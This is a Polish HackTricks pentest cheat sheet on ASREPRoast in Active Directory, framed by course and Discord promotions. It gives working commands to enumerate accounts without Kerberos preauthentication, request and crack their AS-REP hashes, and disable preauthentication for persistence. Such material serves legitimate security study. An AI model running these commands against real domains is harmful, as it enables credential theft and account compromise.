# ASREPRoast

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub.**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami nagród za błędy!

**Wgląd w hakerstwo**\
Zajmuj się treściami, które zagłębiają się w emocje i wyzwania hakerstwa

**Aktualności na żywo z hakerstwa**\
Bądź na bieżąco z szybkim tempem świata hakerstwa dzięki aktualnym wiadomościom i wglądom

**Najnowsze ogłoszenia**\
Bądź na bieżąco z najnowszymi programami bug bounty i ważnymi aktualizacjami platformy

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) **i zacznij współpracować z najlepszymi hakerami już dziś!**

## ASREPRoast

ASREPRoast to atak bezpieczeństwa, który wykorzystuje użytkowników, którzy nie mają atrybutu **wymaganego wstępnego uwierzytelniania Kerberos**. W zasadzie ta podatność pozwala atakującym żądać uwierzytelnienia dla użytkownika od kontrolera domeny (DC) bez konieczności znajomości hasła użytkownika. Następnie DC odpowiada wiadomością zaszyfrowaną kluczem pochodzącym z hasła użytkownika, który atakujący mogą próbować złamać offline, aby odkryć hasło użytkownika.

Główne wymagania dla tego ataku to:
- **Brak wstępnego uwierzytelniania Kerberos**: Użytkownicy docelowi nie mogą mieć tej funkcji zabezpieczenia włączonej.
- **Połączenie z kontrolerem domeny (DC)**: Atakujący potrzebują dostępu do DC, aby wysyłać żądania i odbierać zaszyfrowane wiadomości.
- **Opcjonalne konto domenowe**: Posiadanie konta domenowego umożliwia atakującym bardziej efektywne identyfikowanie podatnych użytkowników za pomocą zapytań LDAP. Bez takiego konta atakujący muszą zgadywać nazwy użytkowników.


#### Wyliczanie podatnych użytkowników (wymagane poświadczenia domenowe)

{% code title="Używając systemu Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% code title="Używając Linuxa" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% code title="Używając Linuxa" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Korzystanie z systemu Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting z Rubeusem wygeneruje 4768 z typem szyfrowania 0x17 i typem preautoryzacji 0.
{% endhint %}

### Łamanie haseł
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Wytrwałość

Wymuś brak wymogu **preauth** dla użytkownika, dla którego masz uprawnienia **GenericAll** (lub uprawnienia do zapisywania właściwości):

{% code title="Korzystając z systemu Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% code title="Używając Linuxa" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## Odwołania

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami błędów!

**Wgląd w hakerstwo**\
Zajmuj się treściami, które zagłębiają się w emocje i wyzwania hakerstwa

**Aktualności na żywo z hakerstwa**\
Bądź na bieżąco z szybkim tempem świata hakerstwa dzięki aktualnym wiadomościom i wglądom

**Najnowsze ogłoszenia**\
Bądź na bieżąco z najnowszymi programami bug bounty i ważnymi aktualizacjami platformy

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hakerami już dziś!

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
